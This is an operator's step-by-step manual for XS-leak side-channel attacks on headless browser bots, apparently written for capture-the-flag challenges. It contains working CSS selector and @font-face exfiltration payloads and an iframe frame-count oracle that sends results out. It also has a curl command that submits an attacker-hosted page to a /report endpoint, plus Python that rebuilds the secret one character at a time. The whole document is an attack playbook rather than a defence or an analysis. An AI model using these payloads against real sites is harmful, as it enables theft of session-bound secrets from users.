# Field manual — the XS-leak workflow, step by step

The operator's sequence for a bot-based side-channel leak.

---

## Phase 0 — name the sub-shape

```bash
# the bot + the URL it visits
grep -rnoiE 'bot|visit|report|goto|newPage|URLBlocklist|URLAllowlist' <src> | head
# the CSP — what's allowed
grep -rnoiE 'content-security-policy|script-src|style-src|font-src|img-src' <src> | head
```

```text
CLASSIC — the bot visits YOUR URL → your JS measures a side-channel
SEALED  — a fixed URL + script-blocked CSP → a declarative/server-state
          channel
the deciding question: can ANY origin the bot reaches run your JS?
```

## Phase 1 — the channel inventory

```text
CLASSIC (client-side measures):
  frames.length — a count oracle
  onload/onerror — a hit/miss oracle
  performance.now() — a timing oracle
  cache-probe — a cached-vs-uncached timing
  :visited — a history read
  window.open — a navigation check

SEALED (declarative/server-state):
  CSS selector → a font/URL load — a char-set or a match
  @font-face unicode-range → a character-set
  LRU eviction → the surviving keys
  counter++ → the next value
  one-shot token → the consumed-or-not bit
```

## Phase 2 — the feasibility arithmetic

```text
- secret's TTL → the whole leak+decode must fit
- request rate → thousands of markers need tens-hundreds rps
- bits/visit → a token=1, a recency=thousands, a CSS=a char-set
- char-set → a sorted/limited alphabet reduces the search
- the bot's context → a flag-holder session, not a plain visitor
```

## Phase 3 — the control pair — always

```css
body[secret]{--yes:url('/leak/YES')}
body[nosuchattr]{--no:url('/leak/NO')}
#trig{background-image:var(--yes,none),var(--no,none)}
```

A YES hit proves the channel works; a NO hit proves 'no leak' isn't
a broken channel. Without both, a negative is uninterpretable.

## Phase 4 — the oracle

```css
/* the CSS-selector oracle — prefix/suffix/substring/exact */
body[secret^="ab"]{--m:url('/leak/ab')}
/* the @font-face char-set — one face per alphabet char */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
#secret{font-family:x;display:block !important}
```

```js
// a classic client-side measure
var f=document.createElement('iframe');
f.src='https://t/search?q='+g;
f.onload=()=>exfil(g+'='+f.contentWindow.frames.length);
```

## Phase 5 — the delivery — the page's path to the bot

```bash
# a /report endpoint — the classic shape
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# a data: URL — an airgapped/null-origin case
# a stored page — same-origin
# a managed-policy bot — a declarative channel only
```

## Phase 6 — the reconstruction — assemble the secret

```python
# a binary-search boolean oracle
known=''
while len(known)<32:
    for c in charset:
        if oracle(known+c): known+=c; break
# a sorted secret — the char-set direct answer
token=''.join(sorted(leaked_chars))
# an n-gram beam search — overlapping substrings
```

## Phase 7 — the verify — the confirm standard

```text
a reconstructed secret is a CANDIDATE until verified:
- submit it → confirm acceptance
- check the confidence score clears a threshold
the channel is the means; the verified secret is the confirm.
```

## Phase 8 — the spend-last oracle — a one-shot token

```text
a GETDEL/single-use token's 'did it survive' is one bit AND burns
the check — spend it AFTER the cheaper channels narrow the answer.
```

## Phase 9 — the blast-radius check — a destructive channel

```text
an LRU flood evicts every other key — possibly the secret itself.
only flood an instance that's yours alone; read the blast_radius.
```

## Phase 10 — the falsifier — when to move

```text
a sealed shape with no CSS oracle and no server-state channel —
the oracle surface is dead → a different class. a classic shape
with an airgapped bot and no server-state read → a write-back or
a different class.
```
